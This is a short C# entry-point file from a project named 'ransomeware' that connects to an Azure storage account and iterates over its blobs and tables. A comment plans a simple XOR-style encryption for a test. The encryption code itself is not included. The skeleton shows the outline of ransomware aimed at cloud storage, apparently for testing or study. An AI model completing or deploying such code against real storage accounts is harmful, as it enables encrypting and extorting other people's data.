using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.WindowsAzure; // Namespace for CloudConfigurationManager
using Microsoft.WindowsAzure.Storage; // Namespace for CloudStorageAccount
using Microsoft.WindowsAzure.Storage.Blob; // Namespace for Blob storage types
using Microsoft.WindowsAzure.Storage.File; // Namespace for File storage types
using Microsoft.WindowsAzure.Storage.Table; // Namespace for Table storage types
using Microsoft.Azure; //Namespace for CloudConfigurationManager

using System.Security.Cryptography; 
//maybe for the test lets make a constant encryption (like xor or something...)

namespace ransomeware
{
    class Program
    {
        static void Main(string[] args)
        {
            CloudStorageAccount storageAccount = Utils.connect();

            Blob_Storage.iterate_blobs(storageAccount);

            Table_Storage.iterate_table(storageAccount);
        }
    }
}
